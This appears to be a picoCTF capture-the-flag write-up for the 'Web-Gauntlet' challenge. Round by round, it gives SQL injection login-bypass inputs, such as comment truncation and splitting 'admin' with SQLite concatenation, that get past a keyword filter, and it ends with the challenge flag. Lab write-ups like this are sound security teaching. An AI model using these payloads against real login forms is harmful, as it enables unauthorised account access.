# Web-Gauntlet
## Category
Web Exploitation
## Problem Description
Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:41560/ http://jupiter.challenges.picoctf.org:41560/filter.php
## Approach
It is clear that the login form is meant to be bypassed using SQL injection.
### Round 1 - filter: or

I used basic injection and commented out the rest of the line.

input: ``` admin'-- ```

``` SELECT * FROM users WHERE username='admin'--' AND password='admin' ```

### Round 2 - filter: or and like = –

Without --, I checked for other ways to comment.

input: ``` admin'/* ```

``` SELECT * FROM users WHERE username='admin'/*' AND password='admin' ```

### Round 3 - filter: or and = like > < –

The first injection from the previous round still works here, but let’s try to get the second to work too.

input: ``` admin'/* ```

``` SELECT * FROM users WHERE username='admin'/*' AND password='admin' ```

### Round 4 - filter: or and = like > < – admin

In SQLITE, || is a concatenation operator. The simple solution is to simply split up “admin” in a way to bypass the filter.

input: ``` adm'||'in'/* ```

``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='admin' ```

### Round 5 - filter: or and = like > < – union admin

Splitting up “admin” still works as only UNION is additionally blacklisted.

input: ``` adm'||'in'/* ```

``` SELECT * FROM users WHERE username='adm'||'in'/* AND password='admin' ```
## Flag
picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}
